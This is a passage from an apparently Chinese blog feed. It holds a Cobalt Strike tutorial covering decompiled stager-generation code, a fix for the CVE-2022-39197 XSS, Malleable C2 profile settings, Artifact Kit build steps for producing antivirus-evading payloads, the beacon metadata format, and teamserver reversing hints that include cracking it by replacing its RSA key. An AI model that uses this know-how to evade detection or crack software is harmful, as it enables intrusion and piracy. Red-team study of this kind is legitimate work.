var1);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> byte[] <span class="hljs-title function_">shellcode</span>(<span class="hljs-params"><span class="hljs-title class_">ScListener</span> var0, <span class="hljs-title class_">String</span> var1, <span class="hljs-title class_">String</span> var2</span>) &#123;<br>   <span class="hljs-title class_">GenericStager</span> var3 = A.<span class="hljs-title function_">resolve</span>(var0, var1, var2);<br>   <span class="hljs-keyword">return</span> var3 != <span class="hljs-literal">null</span> ? var3.<span class="hljs-title function_">generate</span>() : <span class="hljs-keyword">new</span> byte[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>GenericHTTPStager.generate()</code>中，程序读取<code>resources/httpstager64.bin</code>，并根据监听器的host和port等值组合为Packer，最终替换到多个X、Y占位的bin文件中，最后返回bytes[] 类型的shellcode。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">   <span class="hljs-keyword">public</span> byte[] generate() &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         InputStream var1 = CommonUtils.resource(<span class="hljs-keyword">this</span>.getStagerFile());<br>         byte[] var2 = CommonUtils.readAll(var1);<br>         String var3 = CommonUtils.bString(var2);<br>         var1.close();<br>         var3 = var3 + <span class="hljs-keyword">this</span>.getListener().getStagerHost() + <span class="hljs-string">&#x27;\u0000&#x27;</span>;<br>         Packer var4 = new Packer();<br>         var4.little();<br>         var4.addShort(<span class="hljs-keyword">this</span>.getListener().getPort());<br>         AssertUtils.TestPatchS(var2, <span class="hljs-number">4444</span>, <span class="hljs-keyword">this</span>.getPortOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getPortOffset());<br>         var4 = new Packer();<br>         var4.little();<br>         var4.addInt(<span class="hljs-number">1453503984</span>);<br>         AssertUtils.TestPatchI(var2, <span class="hljs-number">1453503984</span>, <span class="hljs-keyword">this</span>.getExitOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getExitOffset());<br>         var4 = new Packer();<br>         var4.little();<br>         var4.addShort(<span class="hljs-keyword">this</span>.getStagePreamble());<br>         AssertUtils.TestPatchS(var2, <span class="hljs-number">5555</span>, <span class="hljs-keyword">this</span>.getSkipOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getSkipOffset());<br>         var4 = new Packer();<br>         var4.little();<br>         var4.addInt(<span class="hljs-keyword">this</span>.getConnectionFlags());<br>         AssertUtils.TestPatchI(var2, <span class="hljs-keyword">this</span>.isSSL() ? -<span class="hljs-number">2069876224</span> : -<span class="hljs-number">2074082816</span>, <span class="hljs-keyword">this</span>.getFlagsOffset());<br>         var3 = CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), <span class="hljs-keyword">this</span>.getFlagsOffset());<br>         String var5;<br>         <span class="hljs-keyword">if</span> (CommonUtils.isin(CommonUtils.repeat(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">303</span>), var3)) &#123;<br>            var5 = <span class="hljs-keyword">this</span>.getConfig().pad(<span class="hljs-keyword">this</span>.getHeaders() + <span class="hljs-string">&#x27;\u0000&#x27;</span>, <span class="hljs-number">303</span>);<br>            var3 = CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">127</span>)));<br>         &#125;<br><br>         int var6 = var3.indexOf(CommonUtils.repeat(<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">79</span>), <span class="hljs-number">0</span>);<br>         var5 = <span class="hljs-keyword">this</span>.getConfig().pad(<span class="hljs-keyword">this</span>.getURI() + <span class="hljs-string">&#x27;\u0000&#x27;</span>, <span class="hljs-number">79</span>);<br>         var3 = CommonUtils.replaceAt(var3, var5, var6);<br>         <span class="hljs-keyword">return</span> CommonUtils.toBytes(var3 + <span class="hljs-keyword">this</span>.getConfig().getWatermark());<br>      &#125; <span class="hljs-keyword">catch</span> (IOException var7) &#123;<br>         MudgeSanity.logException(<span class="hljs-string">&quot;HttpStagerGeneric: &quot;</span> + <span class="hljs-keyword">this</span>.getStagerFile(), var7, <span class="hljs-literal">false</span>);<br>         <span class="hljs-keyword">return</span> new byte[<span class="hljs-number">0</span>];<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CVE-2022-39197"><a href="#CVE-2022-39197" class="headerlink" title="CVE-2022-39197"></a>CVE-2022-39197</h2><p>CVE-2022-39197是由于xss引起的，因此我们可以才采用转义手段，将传入的字符串及进行转义，避免xss攻击。</p><p>修改位置<code>common.BeaconEntry.update</code></p><p><img src="https://img-blog.csdnimg.cn/direct/abeca3947c3d49c7b35c2f1a7380fd3a.png" alt="image-20231001135114168"></p><p>提取自cs 4.8的转义代码<code>common.CommonHTMLUtils</code></p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> common;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonHTMLUtils</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">potentialXSS</span><span class="hljs-params">(String var0)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (var0 == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&lt;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&gt;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&amp;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&#x27;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">return</span> var0.<span class="hljs-title">contains</span><span class="hljs-params">(<span class="hljs-string">&quot;\&quot;&quot;</span>)</span></span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">potentialUserNameXSS</span><span class="hljs-params">(String var0)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (var0 == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&lt;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&gt;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var0.contains(<span class="hljs-string">&quot;&amp;&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">return</span> var0.<span class="hljs-title">contains</span><span class="hljs-params">(<span class="hljs-string">&quot;\&quot;&quot;</span>)</span></span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function">String <span class="hljs-title">escapeHtml</span><span class="hljs-params">(String var0)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (var0 == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">int</span> var1 = var0.length();<br>            <span class="hljs-keyword">int</span> var2 = (<span class="hljs-keyword">int</span>)((<span class="hljs-keyword">double</span>)var1 * <span class="hljs-number">1.3</span>);<br>            StringBuilder var3 = <span class="hljs-keyword">new</span> StringBuilder(var2);<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var4 = <span class="hljs-number">0</span>; var4 &lt; var1; ++var4) &#123;<br>                <span class="hljs-keyword">char</span> var5 = var0.charAt(var4);<br>                <span class="hljs-keyword">if</span> (var5 == <span class="hljs-string">&#x27;&lt;&#x27;</span>) &#123;<br>                    var3.append(<span class="hljs-string">&quot;&amp;lt;&quot;</span>);<br>                &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(var5 == <span class="hljs-string">&#x27;&gt;&#x27;</span>)</span> </span>&#123;<br>                    var3.append(<span class="hljs-string">&quot;&amp;gt;&quot;</span>);<br>                &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(var5 == <span class="hljs-string">&#x27;&quot;&#x27;</span>)</span> </span>&#123;<br>                    var3.append(<span class="hljs-string">&quot;&amp;quot;&quot;</span>);<br>                &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(var5 == <span class="hljs-string">&#x27;&amp;&#x27;</span>)</span> </span>&#123;<br>                    var3.append(<span class="hljs-string">&quot;&amp;amp;&quot;</span>);<br>                &#125; <span class="hljs-function"><span class="hljs-keyword">else</span> <span class="hljs-title">if</span> <span class="hljs-params">(var5 &gt;= <span class="hljs-string">&#x27; &#x27;</span> &amp;&amp; var5 != <span class="hljs-string">&#x27;\&#x27;&#x27;</span>)</span> </span>&#123;<br>                    <span class="hljs-keyword">int</span> var6 = var5 &amp; <span class="hljs-string">&#x27;\uffff&#x27;</span>;<br>                    <span class="hljs-keyword">if</span> (var6 &gt; <span class="hljs-number">127</span>) &#123;<br>                        var3.append(<span class="hljs-string">&quot;&amp;#&quot;</span>).append(var6).append(<span class="hljs-string">&#x27;;&#x27;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        var3.append(var5);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    var3.append(<span class="hljs-string">&quot;&amp;#&quot;</span>).append(var5).append(<span class="hljs-string">&#x27;;&#x27;</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-function"><span class="hljs-keyword">return</span> var3.<span class="hljs-title">toString</span><span class="hljs-params">()</span></span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://cloud.tencent.com/developer/article/2220765">https://cloud.tencent.com/developer/article/2220765</a></p><h2 id="CobaltStrike-profile参数介绍"><a href="#CobaltStrike-profile参数介绍" class="headerlink" title="CobaltStrike profile参数介绍"></a>CobaltStrike profile参数介绍</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li><code>set sample_name &quot;name&quot;；</code>：设置配置文件名称，此处会显示在输出的报告中。</li><li><code>set sleeptime &quot;45000&quot;;</code>：设置休眠时间，单位毫秒。</li><li><code>set jitter &quot;49&quot;;</code>：设置抖动频率，单位%。</li><li><code>set data_jitter &quot;100&quot;;</code>：设置请求数据抖动大小，单位字节。</li><li><code>set useragent &quot;agent&quot;;</code>：设置请求的UA。</li></ul><h3 id="http-get"><a href="#http-get" class="headerlink" title="http-get"></a>http-get</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>​Beacon在执行后会通过get请求不断请求c2服务器以表明Beacon存活状态，http-get代码块中，client代表Beacon向服务器请求规则，server代表服务器向beacon端的响应规则，下面我们详细介绍个字段：</p><ul><li><p><code>set url &lt;url&gt;</code>：设置http-get通信所使用的url，如果设置多个，Beacon每次都会随机选择一个进行通信。</p></li><li><p><code>client</code>：Beacon向服务器请求规则。</p><ul><li><p><code>header</code>：设置http请求头</p></li><li><p><code>metadata</code>：设置元数据编码规则。</p><ul><li><p>CobaltStrike支持5中编码方案。RSA加密后的元数据经过编码处理后，可以方便地在网络协议中传输，CobaltStrike支持地编码方案为Base64、Base64url、Mask、NetBIOS、NetBIOSU，在<code>metadata</code>可以设置多种编码方案，每行一种，CobaltStrike会按照顺序依次进行编码。</p></li><li><p><code>prepend</code>：将指定字符串加载头部。</p></li><li><p><code>append</code>：将指定字符串附加在末尾。</p></li><li><p><code>header</code>：编码完成数据最终存放位置，例如<code>header &quot;Cookie&quot;</code>表示存放在请求头地<code>Cookie</code>字段，我们使用<code>c2lint</code>可以查看具体访问信息。实际上<code>header</code>这种关键字在CobaltStrike中被称为终止关键字，其他详细信息见终止关键字一节。</p><p><img src="https://img-blog.csdnimg.cn/direct/b049dbd0acdd4abfb4634b2c525ec167.png" alt="image-20231102161129064"></p></li></ul></li></ul></li><li><p><code>server</code>：server代表服务器向beacon端的响应规则，配置与<code>client</code>类似，这里不展开介绍。</p></li></ul><h3 id="http-post"><a href="#http-post" class="headerlink" title="http-post"></a>http-post</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>​Beacon在执行时一般会先通过http get请求与c2服务器建立连接，如果c2想要在Beacon中执行命令，会在get请求返回包中发送任务，其中包括此任务地id和任务的具体内容。Beacon在执行完任务后会通过http post请求回传结果，post请求中包括任务id和执行结果，因此在http-post规则配置中要比http-get多一个关于任务id的控制块。</p><ul><li>client<ul><li>id：配置任务id规则。<ul><li><code>parameter</code>：将数据存放在指定url参数中，例如<code>parameter &quot;id&quot;;</code>代表将任务id放在url参数中<code>?id=id</code>中。</li><li><code>output</code>：任务执行结果规则，例如<code>output &#123;base64;print;&#125;</code>表示将执行结果base64编码后存储在body中，<code>print</code>表示编码结束并指定数据存放位置。</li></ul></li></ul></li><li>server</li></ul><h3 id="其他规则"><a href="#其他规则" class="headerlink" title="其他规则"></a>其他规则</h3><h4 id="终止关键字"><a href="#终止关键字" class="headerlink" title="终止关键字"></a>终止关键字</h4><p>​数据编码完成后由终止关键字表明后续不要其他编码并指定存放位置，CobaltStrike支持的终止关键字有：</p><ul><li><code>header &quot;header&quot;</code>：将数据存放在指定HTTP请求头中。</li><li><code>parameter &quot;key&quot;</code>：将数据存放在指定URL请求参数中。</li><li><code>print</code>：将数据存放在http body中。</li><li><code>uri-append</code>：将数据直接拼接到URL后面</li></ul><blockquote><p><code>http-get.client.metadata</code>不能使用<code>print</code>，不在范围内。</p><p><code>http-get.server.output</code>、<code>http-post.server.output</code>、<code>http-stager.server.output</code>只能使用<code>print</code>终止关键字。</p></blockquote><h3 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2">Malleable C2</a></p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/126208502">Cobalt Strike 的 Profile 文件解析</a></p><h2 id="Artifact-Kit安装"><a href="#Artifact-Kit安装" class="headerlink" title="Artifact Kit安装"></a>Artifact Kit安装</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架，在 Cobalt Strike 的 <code>Help --&gt; Arsenal</code> 处可下载 Artifact Kit。</p><p>Cobalt Strike在生成木马时会自动调用Artifact Kit。</p><h3 id="食用方法"><a href="#食用方法" class="headerlink" title="食用方法"></a>食用方法</h3><ul><li>修改配置，在<code>/Arsenal/arsenal_kit.config</code>可以修改构建配置，默认只构建<code>artifact_kit</code>。</li><li>安装编译环境：<code>sudo apt-get install mingw-w64</code>。</li><li>构建工件：执行<code>/Arsenal/build_arsenal_kit.sh</code>，不报错的话会在<code>/Arsenal/</code>生成构建好的工件。</li><li>Load 加载 <code>/Arsenal/artifact/dist-peek/artifact.cna</code> 插件，之后在 <code>Attacks -&gt; Packages -&gt; Windows Executable</code> 中生成木马文件。</li><li>之后在<code>payloads -&gt; Windows Stager payload</code>正常生成木马即可，脚本会自动进行替换，当然可以在<code>Cobalt Strike -&gt; Script Console</code>查看到替换日志输出。</li></ul><h3 id="实验效果"><a href="#实验效果" class="headerlink" title="实验效果"></a>实验效果</h3><p>使用<code>Artifact Kit</code>生成的Stagerless马，竟然能够直接免杀火绒、360，上线直接没反应，啊这。。。。。</p><p><img src="https://img-blog.csdnimg.cn/direct/d58ce23f370140c98c77a60c1cbdf327.png" alt="image-20231029094155837"></p><p><img src="https://img-blog.csdnimg.cn/direct/9c7718b9bd1945cfb05e7bb60689d760.png" alt="image-20231029101609991"></p><p><img src="https://img-blog.csdnimg.cn/direct/cf7834605e184a28830e99e302b29b3b.png" alt="image-20231029101624166"></p><h3 id="疑似bug"><a href="#疑似bug" class="headerlink" title="疑似bug"></a>疑似bug</h3><p>​<code>kits/artifact/build.sh</code>似乎存在bug，报错<code>语法错误：无效的算术运算符</code>，按理说官方文件不应该会出现这种问题，可能是我linux环境有问题，大家各自构建一下，不报错就没问题，如果大家遇到同样的问题，可以将下面的函数替换掉<code>kits/artifact/build.sh</code>的同名函数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros">function check_alignment () &#123;<br>   # This will check the file size <span class="hljs-keyword">and</span> <span class="hljs-built_in">print</span> an <span class="hljs-built_in">error</span> when the<br>   # size is <span class="hljs-keyword">not</span> a multiple of 4-bytes.<br>   # Same as the following command:<br>   #    ls -l dist-pipe | grep -v cna | awk <span class="hljs-string">&#x27;($5 % 4) != 0 &#123;print $5 &quot;\t&quot; $9 &quot;\t Is not 4-byte aligned.&quot;&#125;&#x27;</span><br>   <span class="hljs-attribute">files</span>=$(ls -l <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span> | egrep -v <span class="hljs-string">&quot;cna|total&quot;</span>)<br>   <span class="hljs-attribute">i</span>=-2;<br>   <span class="hljs-attribute">size</span>=0;<br>   <span class="hljs-attribute">file</span>=<span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;files&#125;</span> ; <span class="hljs-keyword">do</span><br>      <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$i</span> -lt 0 ] ; then<br>         # 前两次迭代跳过<br>         <span class="hljs-attribute">i</span>=$((i + 1))<br>         continue<br>      fi<br>      <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;i&#125;</span> == 4 ] ; then<br>         <span class="hljs-attribute">size</span>=<span class="hljs-variable">$&#123;f&#125;</span><br>      elif [ <span class="hljs-variable">$&#123;i&#125;</span> == 8 ] ; then<br>         <span class="hljs-attribute">file</span>=<span class="hljs-variable">$&#123;f&#125;</span><br>         <span class="hljs-keyword">if</span> [ $((<span class="hljs-variable">$&#123;size&#125;</span> % 4)) != 0 ] ; then<br>            print_warning <span class="hljs-string">&quot;[OPSEC] <span class="hljs-variable">$&#123;f&#125;</span> is not 4-byte aligned. Check the compiler options.&quot;</span><br>         fi<br>         <span class="hljs-attribute">i</span>=-8<br>      fi<br>      <span class="hljs-attribute">i</span>=$(($i + 1))<br>   done<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CobaltStrike通信过程详解"><a href="#CobaltStrike通信过程详解" class="headerlink" title="CobaltStrike通信过程详解"></a>CobaltStrike通信过程详解</h2><p>CobaltStrike通信流程一般步骤为：</p><ul><li>使用内置公钥加密aes密钥和beacon基础信息发送至服务端</li><li>服务端通过私钥解密后，通过获取到的aes密钥进行后续加密通信。</li></ul><p>这里我们直接先介绍beacon使用公钥加密的数据内容。</p><p>当服务端收到来自beacon的数据请求时，会将原始数据发送至<code>beacon.BeaconC2.process_beacon_metadata</code>函数进行处理：</p><p><img src="https://img-blog.csdnimg.cn/direct/4139400d240b4f54b0906f85d6945ed2.png" alt="image-20231203195958163"></p><p><code>this.getAsymmetricCrypto().decrypt(var3)</code>为私钥解密过程，跟进查看</p><p><img src="https://img-blog.csdnimg.cn/direct/3aebebb4b2a448f7ba2e177da3a3e36c.png" alt="image-20231203200137114"></p><p>这里展示的是CS4.5版本的<code>this.getAsymmetricCrypto().decrypt(var3)</code>，因为4.5版本后，CS就没有现成的服务端源码了，基本逻辑也大差不差，问题倒不是很大，可以看到经过<code>this.cipher.doFinal</code>解密数据存放在<code>var2</code>中，后续判断<code>Magic number</code>，以及读取了后续相应内容。</p><p>综上所诉，CS首次通信内容格式如下所示：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct &#123;<br>DWORD MagicNum<span class="hljs-comment">; // Magic Num, 默认48879</span><br>DWORD DataLen<span class="hljs-comment">;  // 接下来数据长度</span><br>BYTE [<span class="hljs-number">20</span>]<span class="hljs-comment">;</span><br>DWORD ClientID<span class="hljs-comment">;</span><br>DWORD ProcessID<span class="hljs-comment">;</span><br>WORD Port<span class="hljs-comment">;</span><br>BYTE Flag<span class="hljs-comment">; // 8bit，每bit代表含义如下（/前表示该比特为0表示含义）：/ / / / hith_pric:no/yes is64:no/yes barch:x86/x64 /</span><br>BYTE MajorVersion<span class="hljs-comment">;</span><br>BYTE MinorVersion<span class="hljs-comment">;</span><br>WORD Build<span class="hljs-comment">;</span><br>BYTE Base[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>BYTE Gmh[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>BYTE Gpa[<span class="hljs-number">4</span>]<span class="hljs-comment">;</span><br>DWORD IP<span class="hljs-comment">; // 小端存放，其余为大端存放</span><br><br>BYTE [] <span class="hljs-operator">=</span><span class="hljs-string">&quot;&lt;&lt;hostname&gt;&gt;\t&lt;&lt;user&gt;&gt;\t&lt;&lt;processName&gt;&gt;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="TeamServerImage-逆向"><a href="#TeamServerImage-逆向" class="headerlink" title="TeamServerImage 逆向"></a>TeamServerImage 逆向</h2><p>​从CS4.5开始，CS服务端便使用Graalvm进行的加密处理，虽然Graalvm将大部分符号都进行了处理，但是函数的逻辑相对变化不大，因此我们可以通过client源代码判断部分函数特征，这里记录了原始函数对应的判断特征：</p><h3 id="common-AuthCrypto-decrypt"><a href="#common-AuthCrypto-decrypt" class="headerlink" title="common.AuthCrypto.decrypt"></a>common.AuthCrypto.decrypt</h3><p>在<code>common.AuthCrypto.decrypt</code>存在强特征，直接在<code>ida</code>中搜索<code>BB C0 FE CA</code>（-889274181对应的小端16进制）或<code>D3 C0 FE CA</code>（-889274157对应的小端16进制），存在<code>cmp</code>指令即为该处。</p><p><img src="https://img-blog.csdnimg.cn/direct/a16d9639fbf64560a5801f936478cfca.png" alt="image-20231203202921523"></p><p><img src="https://img-blog.csdnimg.cn/direct/b41fc02727784cd5b677b5277eee2743.png" alt="image-20231203203207426"></p><h3 id="dns-AsymmetricCrypto-decrypt"><a href="#dns-AsymmetricCrypto-decrypt" class="headerlink" title="dns.AsymmetricCrypto.decrypt"></a>dns.AsymmetricCrypto.decrypt</h3><p>在<code>dns.AsymmetricCrypto.decrypt</code>存在<code>Magic number</code>强特征，直接在<code>ida</code>中搜索<code>EF BE 00 00</code>（48879对应的小端16进制），存在<code>cmp</code>指令即为该处。</p><p><img src="https://img-blog.csdnimg.cn/direct/c265299c704d404dbe21bcddd98e0841.png" alt="image-20231203201622035"></p><p><img src="https://img-blog.csdnimg.cn/direct/43ae1d75ef6b465fafda059e48ca944e.png" alt="image-20231203201829001"></p><p>由于，服务端与客户端代码基本类似，因此我们可以以该函数为起点，逆向分析其他功能函数，做相应修改即可。</p><blockquote><p>实际上，存在更加简单方法，我们直接搜索替换二进制文件的RAS密钥就破解完成了，哈哈，偷鸡成功。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
      <category>教程文档</category>
      
      <category>渗透工具</category>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
      <tag>逆向破解</tag>
      
      <tag>渗透工具</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ProxmoxVE教程</title>
    <link href="/2023/08/01/Guide/ProxmoxVE%E6%95%99%E7%A8%8B/"/>
    <url>/2023/08/01/Guide/ProxmoxVE%E6%95%99%E7%A8%8B/</url>
    
